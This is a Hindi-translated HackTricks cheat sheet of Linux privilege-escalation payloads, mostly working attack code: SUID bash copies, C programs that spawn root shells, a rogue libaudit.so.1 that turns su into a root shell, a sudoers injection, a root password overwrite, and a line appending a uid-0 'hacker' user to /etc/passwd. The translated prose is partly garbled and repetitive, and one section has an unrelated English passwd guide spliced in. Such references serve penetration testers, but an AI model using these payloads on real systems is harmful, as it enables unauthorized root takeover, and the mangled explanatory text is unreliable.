# निष्पादित करने के लिए पेलोड

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा संग्रह विशेष [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>

## बैश
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## प्रवेशाधिकार बढ़ाने के लिए उपकरण

इस अध्याय में, हम प्रवेशाधिकार बढ़ाने के लिए उपयोगी टूल्स के बारे में चर्चा करेंगे। ये टूल्स विभिन्न तरीकों का उपयोग करके एक उच्चतम स्तर के उपयोगकर्ता बनने में मदद करते हैं। इन टूल्स का उपयोग करके, हम अनधिकृत रूप से उपयोगकर्ता खातों को उनके अधिकारों के साथ उच्चतम स्तर तक पहुंचा सकते हैं।

### 1. Sudo

Sudo एक लिनक्स आधारित उपकरण है जो उपयोगकर्ताओं को अनुमति देता है अनुप्रयोगों को उच्चतम स्तर तक चलाने के लिए। यह उपकरण उपयोगकर्ताओं को अपने अधिकारों के साथ अनुप्रयोगों को चलाने की अनुमति देता है, जो उन्हें उच्चतम स्तर के उपयोगकर्ता बनाता है।

### 2. SUID/SGID

SUID (Set User ID) और SGID (Set Group ID) बाइनरी फ़ाइलों के लिए अनुमति देते हैं जो उपयोगकर्ता के रूप में या समूह के रूप में उन्नत अधिकारों के साथ चलाए जा सकते हैं। ये अनुमतियाँ उपयोगकर्ताओं को उच्चतम स्तर तक पहुंचने की अनुमति देती हैं और उन्हें अनधिकृत रूप से उपयोगकर्ता खातों को उनके अधिकारों के साथ उच्चतम स्तर तक पहुंचा सकती हैं।

### 3. Capabilities

Capabilities लिनक्स में उपयोगकर्ताओं को अनुमति देते हैं विशेष कार्रवाई करने के लिए, जो उन्हें उच्चतम स्तर के उपयोगकर्ता बनाती हैं। इन क्षमताओं का उपयोग करके, हम अनधिकृत रूप से उपयोगकर्ता खातों को उनके अधिकारों के साथ उच्चतम स्तर तक पहुंचा सकते हैं।

### 4. LD_PRELOAD

LD_PRELOAD एक वर्चुअल एनवायरनमेंट वेरिएबल है जो लिनक्स में उपयोगकर्ताओं को अनुमति देता है अनधिकृत लाइब्रेरी लोड करने के लिए। इसका उपयोग करके, हम अनधिकृत रूप से उपयोगकर्ता खातों को उनके अधिकारों के साथ उच्चतम स्तर तक पहुंचा सकते हैं।

### 5. Cron Jobs

Cron Jobs लिनक्स में निर्धारित समय पर निर्दिष्ट कार्रवाई करने के लिए उपयोग होते हैं। ये कार्रवाई उच्चतम स्तर के उपयोगकर्ता के रूप में या अनधिकृत रूप से उपयोगकर्ता खातों के अधिकारों के साथ चलाई जा सकती हैं। इन क्रॉन जॉब्स का उपयोग करके, हम अनधिकृत रूप से उपयोगकर्ता खातों को उनके अधिकारों के साथ उच्चतम स्तर तक पहुंचा सकते हैं।
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## विशेषाधिकार बढ़ाने के लिए एक फ़ाइल को अधिलेखित करना

### सामान्य फ़ाइलें

* _/etc/passwd_ में पासवर्ड के साथ उपयोगकर्ता जोड़ें
* _/etc/shadow_ में पासवर्ड बदलें
* _/etc/sudoers_ में sudoers में उपयोगकर्ता जोड़ें
* डॉकर सॉकेट के माध्यम से डॉकर का दुरुपयोग करें, सामान्यतः _/run/docker.sock_ या _/var/run/docker.sock_ में

### एक पुस्तकालय को अधिलेखित करना

किसी बाइनरी द्वारा उपयोग की जाने वाली एक पुस्तकालय की जांच करें, इस मामले में `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
इस मामले में हम `/lib/x86_64-linux-gnu/libaudit.so.1` की अनुकरण करने की कोशिश करें।\
इसलिए, **`su`** बाइनरी द्वारा इस पुस्तकालय द्वारा उपयोग की जाने वाली फ़ंक्शनों की जांच करें:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
चिन्ह `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` और `audit_fd` शायद libaudit.so.1 पुस्तकालय से हैं। क्योंकि दुष्ट साझा पुस्तकालय द्वारा libaudit.so.1 को अधिलेखित किया जाएगा, इन चिन्हों को नई साझा पुस्तकालय में मौजूद होना चाहिए, अन्यथा कार्यक्रम चिन्ह को खोजने में असमर्थ होगा और बंद हो जाएगा।
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
अब, **`/bin/su`** को केवल कॉल करके आप एक शेल के रूप में रूट के रूप में प्राप्त करेंगे।

## स्क्रिप्ट

क्या आप रूट को कुछ एक्सीक्यूट करने के लिए बना सकते हैं?

### **www-data से sudoers में**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **रूट पासवर्ड बदलें**

To change the root password, follow these steps:

1. Open a terminal and log in as the root user or use the `su` command to switch to the root user.
2. Type the command `passwd` and press Enter.
3. You will be prompted to enter the new password. Type the new password and press Enter.
4. Retype the new password when prompted and press Enter again.
5. The root password will be changed successfully.

Please note that changing the root password is an important security measure to protect your system from unauthorized access.
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd में नए रूट उपयोगकर्ता जोड़ें
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहते हैं? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके।

</details>
